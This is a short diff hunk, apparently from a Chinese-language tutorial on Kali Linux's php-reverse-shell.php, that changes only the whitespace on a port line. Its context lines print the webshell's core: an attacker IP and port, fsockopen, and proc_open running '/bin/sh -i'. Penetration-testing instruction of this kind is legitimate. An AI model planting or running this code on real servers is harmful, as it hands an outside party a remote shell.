@@ -6,7 +6,7 @@ Kali Linux中，有一个常用的`/usr/share/webshells/php/php-reverse-shell.ph
 set_time_limit(0);
 $VERSION = "1.0";
 $ip = '192.168.1.3';  // CHANGE THIS TO YOUR OWN IP
-$port = 7777;       // CHANGE THIS
+$port = 7777;         // CHANGE THIS
 $shell = 'uname -a; w; id; /bin/sh -i';
 $sock = fsockopen($ip, $port, $errno, $errstr, 30);
 $process = proc_open($shell, $descriptorspec, $pipes);
